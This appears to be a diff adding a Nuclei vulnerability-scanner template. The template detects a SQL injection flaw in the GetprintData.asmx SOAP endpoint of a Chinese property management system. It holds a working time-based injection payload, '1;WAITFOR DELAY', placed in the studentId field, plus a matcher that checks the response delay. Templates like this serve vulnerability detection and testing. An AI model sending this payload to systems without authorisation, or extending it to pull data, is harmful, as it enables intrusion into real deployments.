@@ -1,0 +1,37 @@
+id: New-see_Property_management_GetprintData_SQL_injected
+
+info:
+  name: New-see_Property_management_GetprintData_SQL_injected
+  author: security-xm
+  severity: high
+  description: 新视窗新一代物业管理系统/OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx接口存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    Content-Length: 421
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
+          <studentId>1;WAITFOR DELAY '0:0:4'--</studentId>
+        </GetCertificateInfoByStudentId>
+      </soap:Body>
+    </soap:Envelope>
+
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
